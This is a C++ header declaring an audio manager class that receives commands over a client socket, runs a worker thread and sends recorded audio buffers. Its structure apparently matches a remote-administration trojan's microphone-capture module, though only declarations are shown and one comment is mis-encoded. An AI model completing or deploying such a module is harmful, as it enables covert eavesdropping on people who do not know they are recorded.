
#pragma once


#include "../../../PublicInclude/Manager.h"
#include "Audio.h"

class CAudioManager : public CManager
{
public:
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
	BOOL Initialize();
	CAudioManager(CClientSocket* ClientObject);
	virtual ~CAudioManager();
	BOOL  m_bIsWorking;
	HANDLE m_hWorkThread;
	static DWORD WorkThread(LPVOID lParam);
	BOOL SendRecordBuffer();

	CAudio* m_AudioObject;
	LPBYTE	szPacket; // “Ù∆µª∫¥Ê«¯
};
